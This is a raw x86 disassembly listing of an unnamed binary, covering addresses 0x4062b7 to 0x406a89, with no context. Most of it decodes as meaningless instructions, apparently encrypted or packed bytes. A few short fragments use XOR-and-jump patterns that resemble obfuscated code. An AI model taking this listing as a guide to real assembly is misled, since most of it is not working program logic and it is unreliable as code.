  4062b7:	ror    DWORD PTR [ebp+0x61],1
  4062ba:	addr16 xchg ecx,eax
  4062bc:	adc    dh,BYTE PTR [edx+edx*4]
  4062bf:	jno    0x4062af
  4062c1:	mov    ch,0x2
  4062c3:	xchg   ecx,eax
  4062c4:	and    BYTE PTR ds:0x411a57db,al
  4062ca:	ins    BYTE PTR es:[edi],dx
  4062cb:	es nop
  4062cd:	lahf   
  4062ce:	cmc    
  4062cf:	push   edi
  4062d0:	(bad)  
  4062d1:	xchg   ecx,eax
  4062d2:	cmp    BYTE PTR [edx+0x7ae57bf7],0x91
  4062d9:	pop    esi
  4062da:	lods   al,BYTE PTR ds:[esi]
  4062db:	ror    BYTE PTR [eax-0x28],0xe2
  4062df:	aam    0x6c
  4062e1:	or     DWORD PTR ds:0x3b5ae3c5,ebp
  4062e7:	mov    ebp,0x2757dfe2
  4062ec:	inc    ecx
  4062ed:	cmp    bl,BYTE PTR [edx-0x35]
  4062f0:	add    bl,BYTE PTR ds:0x522e3f7
  4062f6:	loopne 0x406305
  4062f8:	push   esi
  4062f9:	lock mov eax,ds:0xfd53ebb9
  4062ff:	dec    ebx
  406300:	aad    0xfb
  406302:	sbb    BYTE PTR [edi-0x171cd88f],dl
  406308:	xor    dh,BYTE PTR [esi-0x27]
  40630b:	or     esp,ebp
  40630d:	ds cdq 
  40630f:	cmp    al,0x32
  406311:	rol    BYTE PTR [ecx+edi*4+0x15],1
  406315:	cs sbb esp,eax
  406318:	mov    ah,0xf8
  40631a:	xor    bl,BYTE PTR [eax]
  40631c:	pop    ds
  40631d:	mov    ebp,0x14362336
  406322:	nop
  406323:	cmp    esp,DWORD PTR [esi+0x30]
  406326:	loop   0x4062d0
  406328:	aad    0xf8
  40632a:	out    dx,eax
  40632b:	les    edi,FWORD PTR ds:0xe7b48b4a
  406331:	or     DWORD PTR [ecx-0x337a4ab2],0x885952c8
  40633b:	mov    edx,0xfab74a25
  406341:	mov    BYTE PTR [ebx-0x476020c4],0xec
  406348:	or     DWORD PTR [ebp-0x556b17f1],0xffffff9e
  40634f:	dec    esp
  406350:	and    al,0x80
  406352:	xchg   edi,eax
  406353:	(bad)  
  406354:	pop    ebp
  406355:	fisubr DWORD PTR [edi-0x8fc5775]
  40635b:	dec    eax
  40635c:	pushf  
  40635d:	add    eax,0xf179cbc3
  406362:	pop    eax
  406363:	lahf   
  406364:	or     BYTE PTR [edi],cl
  406366:	inc    edi
  406367:	mov    ?,WORD PTR [bp+si+0x54]
  40636b:	mov    esi,0x2bc186f5
  406370:	(bad)  
  406371:	and    esp,esp
  406373:	jmp    0x4063b9
  406375:	(bad)  
  406376:	aad    0x81
  406378:	int3   
  406379:	push   esp
  40637a:	jg     0x406362
  40637c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40637d:	or     al,0xff
  40637f:	pop    esi
  406380:	inc    esp
  406381:	cmc    
  406382:	test   eax,0xb3406e67
  406387:	dec    esp
  406388:	inc    edx
  406389:	scas   al,BYTE PTR es:[edi]
  40638a:	xchg   ebx,eax
  40638b:	sbb    al,0x2c
  40638d:	mov    cl,0x34
  40638f:	(bad)  
  406390:	ins    DWORD PTR es:[edi],dx
  406391:	arpl   WORD PTR [ebx-0x75],bp
  406394:	int    0x1f
  406396:	loop   0x4063d8
  406398:	fstp   DWORD PTR ds:0x5340970a
  40639e:	nop
  40639f:	(bad)  
  4063a0:	rcr    ecx,1
  4063a2:	jbe    0x4063ec
  4063a4:	and    DWORD PTR [eax],eax
  4063a6:	jge    0x40638f
  4063a8:	jmp    0x406359
  4063aa:	daa    
  4063ab:	les    ebx,FWORD PTR ds:0xa5f9f21a
  4063b1:	leave  
  4063b2:	fldcw  WORD PTR [ebx-0x2]
  4063b5:	push   esi
  4063b6:	lock imul esp,DWORD PTR [edi-0x415f22d4],0xf95e17e4
  4063c1:	and    esp,edi
  4063c3:	retf   0xd78f
  4063c6:	sbb    al,0xa3
  4063c8:	popa   
  4063c9:	jl     0x4063cc
  4063cb:	push   edx
  4063cc:	adc    edx,DWORD PTR [esi+0x170cbe57]
  4063d2:	loop   0x40644e
  4063d4:	in     eax,0x10
  4063d6:	pop    esi
  4063d8:	adc    BYTE PTR [esi+0x1d3feb76],ah
  4063de:	in     al,dx
  4063df:	cmp    ah,BYTE PTR [ecx-0x4fef3b6e]
  4063e5:	sbb    eax,0xce414df
  4063ea:	adc    esi,DWORD PTR [eax-0x1e]
  4063ed:	mov    cl,0x6c
  4063ef:	jmp    0x40639c
  4063f1:	retf   0xb2a5
  4063f4:	ret    0xe64
  4063f7:	xor    eax,0x5159564a
  4063fc:	dec    esi
  4063fd:	aaa    
  4063fe:	push   edx
  4063ff:	xchg   ebp,eax
  406400:	(bad)  
  406401:	push   cs
  406402:	dec    ebx
  406403:	ret    0x397a
  406406:	mov    ch,0x4b
  406408:	repnz lods al,BYTE PTR ds:[esi]
  40640a:	(bad)  
  40640b:	push   edx
  40640c:	and    edi,edi
  40640e:	scas   al,BYTE PTR es:[edi]
  40640f:	push   ecx
  406410:	jp     0x4063f9
  406412:	mov    ch,0x66
  406414:	dec    esi
  406415:	mov    bh,0xd2
  406417:	pop    ecx
  406418:	shr    edx,0x2
  40641b:	sub    edx,0x5589
  406421:	mov    DWORD PTR [ebp-0x1c],ecx
  406424:	or     DWORD PTR ds:0x4229ae,edx
  40642a:	mov    ecx,DWORD PTR [ebx]
  40642c:	and    DWORD PTR ds:0x4228fe,edi
  406432:	mov    edx,DWORD PTR [ebx+0x4]
  406435:	xor    DWORD PTR [ebp-0x1c],edi
  406438:	or     DWORD PTR ds:0x4228ee,0x53f5
  406442:	xor    edx,edx
  406444:	jmp    0x4069ce
  406449:	fisttp DWORD PTR [ecx+0x7b]
  40644c:	mov    WORD PTR [ecx],ds
  40644e:	xor    al,0xe0
  406450:	sbb    BYTE PTR [ebp+0x616e9a4b],bl
  406456:	stos   DWORD PTR es:[edi],eax
  406457:	xor    ch,BYTE PTR [eax+0x65]
  40645a:	adc    DWORD PTR [esi],0x16
  40645d:	cmp    eax,0x2a161604
  406462:	imul   edx,DWORD PTR [ebx+0x1e],0x3c3d1658
  406469:	push   ss
  40646a:	mov    bl,0xe6
  40646c:	enter  0x7b5f,0x29
  406470:	and    DWORD PTR [eax],ebp
  406472:	cmp    DWORD PTR [ecx],edx
  406474:	xchg   edi,eax
  406475:	call   0x9d4e933a
  40647a:	mov    esi,0xb50c95
  40647f:	fidivr WORD PTR [eax+eiz*2-0x7e]
  406483:	pusha  
  406484:	test   DWORD PTR [eax],edi
  406486:	sahf   
  406487:	inc    ecx
  406488:	jns    0x406506
  40648a:	sub    BYTE PTR cs:[esi-0x3e],ah
  40648e:	bound  ecx,QWORD PTR [esi]
  406490:	mov    ah,0x15
  406492:	stos   BYTE PTR es:[edi],al
  406493:	retf   
  406494:	pop    es
  406495:	xor    dh,BYTE PTR [esi-0xbfda943]
  40649b:	add    ecx,DWORD PTR [eax-0x5e]
  40649e:	in     al,0x80
  4064a0:	sbb    cl,BYTE PTR [edx]
  4064a2:	cmp    al,0x23
  4064a4:	pushf  
  4064a5:	jbe    0x406491
  4064a7:	push   ebp
  4064a8:	lock mov ecx,0x1ad30a27
  4064ae:	add    BYTE PTR [edx],dl
  4064b0:	add    BYTE PTR [esi-0x56],ch
  4064b3:	dec    esi
  4064b4:	add    BYTE PTR [ebx],ch
  4064b6:	add    eax,0x6192ba5d
  4064bb:	rcl    DWORD PTR [ebx],cl
  4064bd:	aas    
  4064be:	jg     0x40646e
  4064c0:	jno    0x4064ea
  4064c2:	cld    
  4064c3:	or     edx,ebp
  4064c5:	xlat   BYTE PTR ds:[ebx]
  4064c6:	je     0x40645b
  4064c8:	int3   
  4064c9:	sbb    eax,0x671ab015
  4064ce:	cs jle 0x406510
  4064d1:	push   ebp
  4064d2:	fwait
  4064d3:	jmp    0x40648c
  4064d5:	cwde   
  4064d6:	adc    al,0xc9
  4064d8:	or     eax,0xad56d078
  4064dd:	jne    0x40652f
  4064df:	add    cl,ch
  4064e1:	push   ebx
  4064e2:	nop
  4064e3:	das    
  4064e4:	xor    al,0x5c
  4064e6:	out    0xa6,eax
  4064e8:	sbb    eax,0xb1831fdf
  4064ed:	jnp    0x406557
  4064ef:	cmp    eax,0x3cd9735b
  4064f4:	test   eax,0xc0ce6f8c
  4064f9:	pop    eax
  4064fa:	xor    eax,0xa1184e24
  4064ff:	or     al,0x79
  406501:	jbe    0x4064c8
  406503:	sub    esi,edx
  406505:	cmp    al,ah
  406507:	sbb    DWORD PTR [edx],ecx
  406509:	popf   
  40650a:	je     0x4064bc
  40650c:	outs   dx,BYTE PTR ds:[esi]
  40650d:	inc    ebp
  40650e:	sub    DWORD PTR [ebx],esp
  406510:	stos   DWORD PTR es:[edi],eax
  406511:	jae    0x40653f
  406513:	inc    ecx
  406514:	and    eax,eax
  406516:	shl    BYTE PTR [edi+0x39219d4c],1
  40651c:	mov    ecx,0xb0b2921d
  406521:	dec    ebx
  406522:	addr16 jmp 0x4064ab
  406525:	stos   DWORD PTR es:[edi],eax
  406526:	leave  
  406527:	loopne 0x4065a4
  406529:	xor    DWORD PTR [edx-0x6d8decc0],ebp
  40652f:	xchg   DWORD PTR [edx-0x10],esi
  406532:	cmp    bl,bh
  406534:	cld    
  406535:	cwde   
  406536:	xchg   edi,eax
  406537:	dec    BYTE PTR [edx+0x175b24a2]
  40653d:	jo     0x4065ac
  40653f:	jle    0x40653c
  406541:	fsub   st(2),st
  406543:	mov    edi,DWORD PTR [edi]
  406545:	call   0x77597fcd
  40654a:	jp     0x4065bc
  40654c:	pushf  
  40654d:	mov    cl,0x30
  40654f:	inc    ebx
  406550:	push   es
  406551:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406552:	fcomp  DWORD PTR [ecx]
  406554:	jne    0x40656d
  406556:	inc    edx
  406557:	sti    
  406558:	fld    TBYTE PTR ds:0x3713f914
  40655e:	icebp  
  40655f:	mov    WORD PTR ds:0xeaa11119,es
  406565:	xchg   esi,eax
  406566:	xchg   ecx,edi
  406568:	mov    dh,0xed
  40656a:	push   esi
  40656b:	adc    al,0xc8
  40656d:	inc    eax
  40656e:	dec    ecx
  40656f:	call   0xd0d5:0x1ed601f4
  406576:	adc    ah,al
  406578:	cmp    eax,ebx
  40657a:	cli    
  40657b:	xor    al,0x4f
  40657d:	js     0x406569
  40657f:	fmul   DWORD PTR [edi]
  406581:	mov    cs,eax
  406583:	ror    DWORD PTR [edi+0x7e26db00],1
  406589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40658a:	mov    ah,0x4
  40658c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40658d:	int3   
  40658e:	mov    cl,0x60
  406590:	or     DWORD PTR [edx],edx
  406592:	xor    al,0x53
  406594:	and    al,0x37
  406596:	fsub   DWORD PTR [ebx]
  406598:	(bad)  
  406599:	adc    al,BYTE PTR [esi]
  40659b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40659c:	sbb    DWORD PTR [esi],eax
  40659e:	inc    ebp
  40659f:	jge    0x406572
  4065a1:	fmul   QWORD PTR [edx-0x46]
  4065a5:	xor    eax,DWORD PTR [ecx+0x2a101132]
  4065ab:	ret    
  4065ac:	push   ds
  4065ad:	jbe    0x40657f
  4065af:	test   BYTE PTR [eax+ebp*8-0x16],dl
  4065b3:	add    al,0x75
  4065b5:	add    DWORD PTR ds:0x2acc59af,eax
  4065bb:	fsub   st(7),st
  4065bd:	ret    
  4065be:	jge    0x406578
  4065c0:	jecxz  0x4065a1
  4065c2:	jmp    0xfc6c:0xf268ce26
  4065c9:	xor    eax,0x9305070d
  4065ce:	dec    esp
  4065cf:	enter  0x3c09,0x62
  4065d3:	cmc    
  4065d4:	mov    cl,0xaf
  4065d6:	xor    DWORD PTR [esi-0x41],ecx
  4065d9:	cmp    eax,0xb20a41da
  4065de:	ja     0x40657c
  4065e0:	hlt    
  4065e1:	out    0xcd,al
  4065e3:	sub    eax,0x91c767e2
  4065e8:	mov    dl,BYTE PTR [ecx+0x4c887701]
  4065ee:	push   ds
  4065ef:	sahf   
  4065f0:	and    DWORD PTR [edi+esi*4+0x66],ecx
  4065f4:	push   ecx
  4065f5:	add    bh,bl
  4065f7:	cmc    
  4065f8:	push   es
  4065f9:	das    
  4065fa:	scas   eax,DWORD PTR es:[edi]
  4065fb:	rcr    DWORD PTR [ecx+ebx*2],0xfd
  4065ff:	sbb    BYTE PTR [edi],al
  406601:	mov    esp,0xfd7af8a7
  406606:	adc    DWORD PTR [ebp+0x70],esp
  406609:	and    ebx,DWORD PTR [edi+0x44f12e1]
  40660f:	hlt    
  406610:	les    edi,FWORD PTR [edx+0x14]
  406613:	lahf   
  406614:	cmp    bh,dh
  406616:	xchg   edx,eax
  406617:	gs pop ss
  406619:	stos   BYTE PTR es:[edi],al
  40661a:	repnz adc eax,0x9afe651d
  406620:	sbb    eax,0xffe79610
  406625:	push   eax
  406626:	(bad)  
  406627:	je     0x40660e
  406629:	mov    ecx,0x2fc6bf9f
  40662e:	lahf   
  40662f:	pop    ds
  406630:	adc    eax,0xac714f55
  406635:	inc    edi
  406636:	fmulp  st(6),st
  406638:	pop    eax
  406639:	pop    esp
  40663a:	stos   BYTE PTR es:[edi],al
  40663b:	jmp    0x4065c9
  40663d:	nop
  40663e:	imul   ebp,DWORD PTR [ebx+edi*8-0x3b],0xd8faa917
  406646:	in     eax,0x7d
  406648:	cdq    
  406649:	sbb    al,0x55
  40664b:	push   ecx
  40664c:	cld    
  40664d:	ficomp WORD PTR [edi-0x30]
  406650:	push   esp
  406651:	fs adc eax,DWORD PTR gs:[edi+0x4]
  406656:	jo     0x40665f
  406658:	scas   al,BYTE PTR es:[edi]
  406659:	xchg   esp,eax
  40665a:	mov    cl,0x57
  40665c:	clc    
  40665d:	lds    edi,FWORD PTR [ebp-0x5a84a457]
  406663:	int3   
  406664:	push   0xffffff81
  406666:	hlt    
  406667:	jae    0x4066c8
  406669:	mov    BYTE PTR ds:0xd09a976,bl
  40666f:	dec    DWORD PTR [ebx-0x7884f695]
  406675:	gs mov edi,0x551a4a62
  40667b:	pop    ecx
  40667c:	aam    0x9f
  40667e:	sti    
  40667f:	pop    edi
  406680:	sub    al,0x6f
  406682:	cmp    DWORD PTR [ebp-0x32a46338],ecx
  406688:	mov    esi,DWORD PTR [ecx+0x19d2ab03]
  40668e:	and    eax,0x563195ee
  406693:	xchg   ebx,eax
  406694:	push   esi
  406695:	sub    eax,0x39b89146
  40669a:	adc    DWORD PTR [ecx],ecx
  40669c:	mov    esp,0xa7189508
  4066a1:	push   ebp
  4066a2:	inc    edx
  4066a3:	mov    ds:0x6b97a06c,eax
  4066a8:	es xchg ebx,eax
  4066aa:	jl     0x4066dd
  4066ac:	fwait
  4066ad:	inc    ebx
  4066ae:	adc    eax,0x511ea50e
  4066b3:	push   eax
  4066b4:	out    dx,eax
  4066b5:	cmc    
  4066b6:	pop    ss
  4066b7:	aas    
  4066b8:	pop    ss
  4066b9:	dec    ebx
  4066ba:	call   0xb2fd2180
  4066bf:	aad    0x18
  4066c1:	and    BYTE PTR [ecx+edi*2],dh
  4066c4:	out    dx,eax
  4066c5:	pop    es
  4066c6:	repz push esp
  4066c8:	inc    DWORD PTR [ebx]
  4066ca:	add    BYTE PTR [edx-0x1fc70909],al
  4066d0:	shl    esi,cl
  4066d2:	inc    ecx
  4066d3:	mov    WORD PTR [ecx-0x1],ss
  4066d6:	dec    edx
  4066d7:	xchg   edx,eax
  4066d8:	outs   dx,DWORD PTR ds:[esi]
  4066d9:	rcr    DWORD PTR [edi-0x64],1
  4066dc:	adc    BYTE PTR [ebp+0x48],ch
  4066df:	xchg   edi,eax
  4066e0:	sbb    al,0xfa
  4066e2:	sbb    ecx,ebx
  4066e4:	inc    edi
  4066e5:	aad    0xda
  4066e7:	mov    eax,ds:0xb6c7bf04
  4066ec:	ins    BYTE PTR es:[edi],dx
  4066ed:	add    dh,BYTE PTR [ebp-0x603ee993]
  4066f3:	call   0x33cb:0x363f624f
  4066fa:	iret   
  4066fb:	adc    DWORD PTR [edi-0x5ce1de0b],ebp
  406701:	dec    esi
  406702:	cmp    BYTE PTR [edx-0x120877c4],dl
  406708:	jo     0x40676f
  40670a:	(bad)  
  40670c:	aas    
  40670d:	test   BYTE PTR [esi+0x311b85cf],dh
  406713:	in     al,dx
  406714:	inc    ebx
  406715:	leave  
  406716:	nop
  406717:	xor    eax,0xeb78c27b
  40671c:	mov    dh,0x42
  40671e:	inc    ebp
  40671f:	and    cl,bl
  406721:	js     0x40676f
  406723:	clc    
  406724:	and    DWORD PTR [edx+0x63],esp
  406727:	xchg   ecx,eax
  406728:	mov    eax,ebp
  40672a:	ins    DWORD PTR es:[edi],dx
  40672b:	sbb    bh,dl
  40672d:	out    dx,eax
  40672e:	xchg   DWORD PTR [ebx+0x62],edx
  406731:	outs   dx,BYTE PTR ds:[esi]
  406732:	or     bl,BYTE PTR [edi+ebx*4+0x18094f4e]
  406739:	adc    edx,edx
  40673b:	jp     0x406758
  40673d:	and    eax,0xedbd4ce0
  406742:	or     ah,BYTE PTR [eax+esi*2+0x3e1ca9f5]
  406749:	mov    esi,0xd31241e5
  40674e:	dec    esi
  40674f:	(bad)  
  406750:	into   
  406751:	xchg   DWORD PTR [esi+0x3e],ebp
  406754:	mov    al,ds:0x9ce0c491
  406759:	arpl   dx,cx
  40675b:	lods   al,BYTE PTR ds:[esi]
  40675c:	xlat   BYTE PTR ds:[ebx]
  40675d:	pop    esp
  40675e:	stos   DWORD PTR es:[edi],eax
  40675f:	in     al,0xb8
  406761:	das    
  406762:	dec    ebx
  406763:	lods   al,BYTE PTR ds:[esi]
  406764:	jge    0x4067d0
  406766:	dec    BYTE PTR [ebx-0x3]
  406769:	jmp    0xed959f36
  40676e:	jo     0x406716
  406770:	neg    dl
  406772:	dec    esp
  406773:	inc    edx
  406774:	cmc    
  406775:	js     0x406738
  406777:	push   ss
  406778:	pop    es
  406779:	jb     0x4067de
  40677b:	mov    es,edx
  40677d:	out    dx,eax
  40677e:	mov    bl,0x86
  406780:	and    dl,dh
  406782:	xor    eax,0x952b7412
  406787:	cmp    al,0x77
  406789:	retf   0xf1b5
  40678c:	xor    eax,0x8af70ac0
  406791:	lock sbb bh,BYTE PTR [ebx+ebx*8+0x69]
  406796:	ins    BYTE PTR es:[edi],dx
  406797:	jb     0x40673a
  406799:	pop    es
  40679a:	jbe    0x406783
  40679c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40679d:	jnp    0x4067d7
  40679f:	cmp    eax,0x824f4d6b
  4067a4:	out    dx,eax
  4067a5:	fidivr WORD PTR [edx-0x44]
  4067a8:	cmp    bh,BYTE PTR [ecx-0x41]
  4067ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067ac:	jmp    0x4da3:0x682daaa6
  4067b3:	xchg   esp,eax
  4067b4:	repz loopne 0x406771
  4067b7:	repz ror DWORD PTR [edi],cl
  4067ba:	es lahf 
  4067bc:	xchg   edx,eax
  4067bd:	adc    ch,dl
  4067bf:	imul   BYTE PTR [edi+0x71]
  4067c2:	ret    
  4067c3:	ror    dh,0x1e
  4067c6:	jns    0x406818
  4067c8:	mov    al,ds:0x74ae1b6e
  4067cd:	(bad)  
  4067ce:	dec    ebx
  4067cf:	lods   eax,DWORD PTR ds:[esi]
  4067d0:	mov    cl,0x4c
  4067d2:	int    0x37
  4067d4:	mov    eax,?
  4067d6:	pushf  
  4067d7:	mov    ch,BYTE PTR [ebp-0xf21426f]
  4067dd:	ror    BYTE PTR [ebx],0xc
  4067e0:	outs   dx,DWORD PTR ds:[esi]
  4067e1:	je     0x40678d
  4067e3:	pushf  
  4067e4:	xor    DWORD PTR [ecx-0x6f],ebx
  4067e7:	fwait
  4067e8:	int3   
  4067e9:	into   
  4067ea:	clc    
  4067eb:	call   0xacec:0x9aad0dc5
  4067f2:	cmp    DWORD PTR [esi],edi
  4067f4:	push   eax
  4067f5:	adc    bl,BYTE PTR [edx-0x64]
  4067f8:	outs   dx,BYTE PTR ds:[esi]
  4067f9:	es dec edx
  4067fb:	popf   
  4067fc:	and    eax,0xb46ce3c8
  406801:	outs   dx,DWORD PTR ds:[esi]
  406802:	jmp    0x9237165b
  406807:	and    al,0x6b
  406809:	mov    esi,0x220245a6
  40680e:	sti    
  40680f:	pop    ss
  406810:	push   ds
  406811:	fisttp DWORD PTR [ebp-0x64e5c7e1]
  406817:	dec    eax
  406818:	rcr    DWORD PTR [ebp+0x5f14c5f5],1
  40681e:	mov    ds,WORD PTR [esi+eax*2-0x32]
  406822:	adc    esp,DWORD PTR ds:0x376d88ce
  406828:	dec    BYTE PTR [eax]
  40682a:	jnp    0x406867
  40682c:	sub    ch,0xb3
  40682f:	mov    ds:0x17a884df,eax
  406834:	inc    ebp
  406835:	xchg   DWORD PTR [ebp+0x64],edi
  406838:	xor    DWORD PTR [edi-0x70],edi
  40683b:	xchg   edx,eax
  40683c:	rcl    al,1
  40683e:	jg     0x4067eb
  406840:	test   cl,bh
  406842:	mov    BYTE PTR [ecx],0x7e
  406845:	retf   
  406846:	aad    0x11
  406848:	outs   dx,BYTE PTR ds:[esi]
  406849:	pop    eax
  40684a:	mov    al,0xa2
  40684c:	sbb    BYTE PTR [edx],ch
  40684e:	pop    edi
  40684f:	lock and esp,DWORD PTR [eax+edi*1+0x41]
  406854:	pop    esi
  406855:	adc    al,0xef
  406857:	fcomip st,st(0)
  406859:	sbb    BYTE PTR [ebx+0x40],dh
  40685c:	int    0xfb
  40685e:	scas   al,BYTE PTR es:[edi]
  40685f:	repz mov ebx,DWORD PTR [ebp+0x34]
  406863:	pop    ds
  406864:	push   ss
  406865:	push   esi
  406866:	push   es
  406867:	inc    edi
  406868:	ds adc dl,dh
  40686b:	add    BYTE PTR [edi+0x74],0x2b
  40686f:	mov    ecx,0x29ded059
  406874:	mov    edx,0xb028bc37
  406879:	mov    ecx,0x3e4164fb
  40687e:	mov    dh,0xc9
  406880:	int    0xea
  406882:	sub    cl,BYTE PTR [edx]
  406884:	jns    0x406883
  406886:	iret   
  406887:	pushf  
  406888:	je     0x4068d7
  40688a:	dec    edi
  40688b:	int3   
  40688c:	cdq    
  40688d:	out    dx,eax
  40688e:	sub    eax,DWORD PTR [ecx]
  406890:	in     al,0x37
  406892:	xor    DWORD PTR [edx+0x4c409473],edx
  406898:	inc    edi
  406899:	cmp    al,0x13
  40689b:	(bad)  
  40689c:	inc    ebp
  40689d:	iret   
  40689e:	cdq    
  40689f:	mov    ds:0x35e2952a,eax
  4068a4:	dec    eax
  4068a5:	shl    dh,cl
  4068a7:	push   eax
  4068a8:	ins    DWORD PTR es:[edi],dx
  4068a9:	cmp    esp,DWORD PTR [esi]
  4068ab:	mov    esi,0x7876b28e
  4068b0:	les    esp,FWORD PTR [edi+0x48cd6ac4]
  4068b6:	je     0x40686b
  4068b8:	adc    eax,0xe86553b
  4068bd:	mov    ch,0x61
  4068bf:	(bad)  
  4068c0:	cli    
  4068c1:	call   0x55c4:0x5892caef
  4068c8:	arpl   WORD PTR [edx+0x43ff690c],sp
  4068ce:	jl     0x406936
  4068d0:	and    dh,bh
  4068d2:	es or  al,0x9d
  4068d5:	(bad)  
  4068d6:	inc    esp
  4068d7:	mov    ss,WORD PTR [esi+edi*2]
  4068da:	mov    al,0x83
  4068dc:	imul   ecx,DWORD PTR [ecx-0x57d25835],0x207853ff
  4068e6:	or     eax,0x37e29fa1
  4068eb:	ret    0xdf34
  4068ee:	outs   dx,BYTE PTR ds:[esi]
  4068ef:	mov    ch,BYTE PTR [ebx+0x78]
  4068f2:	retf   
  4068f3:	dec    ecx
  4068f4:	mov    al,ds:0x98f5a401
  4068f9:	icebp  
  4068fa:	out    dx,eax
  4068fb:	inc    esi
  4068fc:	pop    esi
  4068fd:	aad    0xdc
  4068ff:	imul   edi,edi,0xf8006e1c
  406905:	pop    esi
  406906:	outs   dx,BYTE PTR ds:[esi]
  406907:	or     ah,BYTE PTR [ebx+0x10]
  40690a:	cmp    dh,BYTE PTR [ebx+edi*2+0x24]
  40690e:	xchg   esi,eax
  40690f:	push   es
  406910:	xor    edx,0xffffffac
  406913:	(bad)  
  406914:	adc    eax,0x64f0c90
  406919:	cmp    al,0x5a
  40691b:	add    bl,BYTE PTR [esi]
  40691d:	jmp    0x421aa408
  406922:	push   0x6835bfdc
  406927:	pushf  
  406928:	jge    0x406902
  40692a:	sub    dh,bl
  40692c:	and    DWORD PTR [ecx+0x5ec2a17e],eax
  406932:	aam    0xd0
  406934:	cmp    BYTE PTR [esi-0x26],bh
  406937:	mov    dh,0xd8
  406939:	fldcw  WORD PTR [esi+0x41]
  40693c:	dec    ecx
  40693d:	loop   0x406940
  40693f:	dec    ebp
  406940:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406941:	(bad)  
  406942:	stos   BYTE PTR es:[edi],al
  406943:	mov    DWORD PTR [ecx-0x5b],ecx
  406946:	fs push ebx
  406948:	mov    ch,0x89
  40694a:	pop    ecx
  40694b:	pop    edx
  40694c:	loope  0x4069b0
  40694e:	sub    eax,0xed12beb9
  406953:	adc    eax,0xa398acf0
  406958:	pop    eax
  406959:	call   0xb666:0x82e7758
  406960:	jo     0x406901
  406962:	mov    dh,BYTE PTR ds:0x7f6b01d2
  406968:	nop
  406969:	fstp   QWORD PTR [eax-0x17cc37a6]
  40696f:	lea    esi,ds:0x4183d7e7
  406975:	test   al,0x1a
  406977:	test   ecx,ebp
  406979:	and    edx,esp
  40697b:	sub    cl,BYTE PTR [ecx+0xe]
  40697e:	xor    BYTE PTR [ebx-0x5],al
  406981:	cdq    
  406982:	xchg   edi,eax
  406983:	jbe    0x406935
  406985:	sti    
  406986:	or     dh,bh
  406988:	cmp    al,0x30
  40698a:	sahf   
  40698b:	pusha  
  40698c:	and    BYTE PTR [ecx],dl
  40698e:	sub    eax,0x70d3dc2c
  406993:	int3   
  406994:	inc    edx
  406995:	adc    ah,ah
  406997:	cdq    
  406998:	xchg   edi,eax
  406999:	js     0x4069a3
  40699b:	sub    bh,BYTE PTR [esi]
  40699d:	dec    edi
  40699e:	dec    ecx
  40699f:	xchg   ecx,eax
  4069a0:	jbe    0x40695d
  4069a2:	mov    ebp,0x7993fa08
  4069a8:	jnp    0x406944
  4069aa:	xlat   BYTE PTR ds:[ebx]
  4069ab:	shr    DWORD PTR [ecx+0x7ad5513e],cl
  4069b1:	push   0x43ebe690
  4069b6:	call   0x4520a150
  4069bb:	sub    eax,0x17f745d6
  4069c0:	cld    
  4069c1:	sti    
  4069c2:	dec    esi
  4069c3:	and    esi,DWORD PTR [esi]
  4069c5:	inc    ebx
  4069c6:	sbb    bl,BYTE PTR [edx+ecx*1]
  4069c9:	test   al,0x89
  4069cb:	jg     0x4069b8
  4069cd:	ins    DWORD PTR es:[edi],dx
  4069ce:	or     edx,DWORD PTR [ebp-0x1c]
  4069d1:	shl    ecx,0x1e
  4069d4:	sub    DWORD PTR ds:0x4228b2,0x1171
  4069de:	imul   edx,DWORD PTR [ebp-0x2c]
  4069e2:	sub    DWORD PTR [eax],edx
  4069e4:	mov    DWORD PTR ds:0x4228ae,0x6b62
  4069ee:	jmp    0x4076e1
  4069f3:	sub    edx,ecx
  4069f5:	mov    ecx,DWORD PTR [esi]
  4069f7:	mov    edx,DWORD PTR [esi+0x4]
  4069fa:	sbb    DWORD PTR ds:0x42293a,0x607d
  406a04:	shrd   ecx,edx,0x2
  406a08:	mov    DWORD PTR [ebp-0x1c],ecx
  406a0b:	mov    ecx,DWORD PTR [esi]
  406a0d:	xor    DWORD PTR [ebp-0x1c],edi
  406a10:	adc    DWORD PTR ds:0x42288e,0x77db
  406a1a:	jmp    0x406fa4
  406a1f:	bound  ebx,QWORD PTR [ecx-0xe]
  406a22:	imul   edi,ecx,0x71
  406a25:	push   edx
  406a26:	pop    eax
  406a27:	fst    DWORD PTR [eax]
  406a29:	std    
  406a2a:	mov    ah,0x63
  406a2c:	mov    ah,0xf5
  406a2e:	push   0x16168192
  406a33:	cmp    eax,0x82161604
  406a38:	shl    DWORD PTR [esi+0x14],0xfb
  406a3c:	in     al,dx
  406a3d:	jb     0x406a8b
  406a3f:	xchg   ecx,eax
  406a40:	inc    esi
  406a41:	es scas al,BYTE PTR es:[edi]
  406a43:	sbb    edx,0x80f34872
  406a49:	adc    BYTE PTR [ecx-0x79],bh
  406a4c:	xor    ebx,edx
  406a4e:	xor    DWORD PTR [ecx],esi
  406a50:	dec    ebx
  406a51:	lahf   
  406a52:	sbb    esi,DWORD PTR [edx-0x673a34b6]
  406a58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a59:	mov    ecx,DWORD PTR [ebp+0x4fd7937a]
  406a5f:	out    0x1b,al
  406a61:	jp     0x406a25
  406a63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a64:	cld    
  406a65:	pop    edx
  406a66:	inc    BYTE PTR [ebp-0x62644516]
  406a6c:	inc    ebp
  406a6d:	xchg   edi,eax
  406a6e:	inc    esi
  406a6f:	out    0x20,al
  406a71:	iret   
  406a72:	mov    WORD PTR [ebp+0x3d],cs
  406a75:	xor    esp,DWORD PTR [ebx]
  406a77:	pop    edi
  406a78:	inc    esi
  406a79:	repz xchg esi,eax
  406a7b:	mov    DWORD PTR [ebx],ebx
  406a7d:	in     eax,0x76
  406a7f:	outs   dx,DWORD PTR ds:[esi]
  406a80:	fist   DWORD PTR [eax+0x7b]
  406a83:	into   
  406a84:	mov    DWORD PTR [ecx+ebp*8-0x37],eax
  406a88:	xchg   esi,eax
  406a89:	cmp    BYTE PTR [eax+0x549c4e5],cl
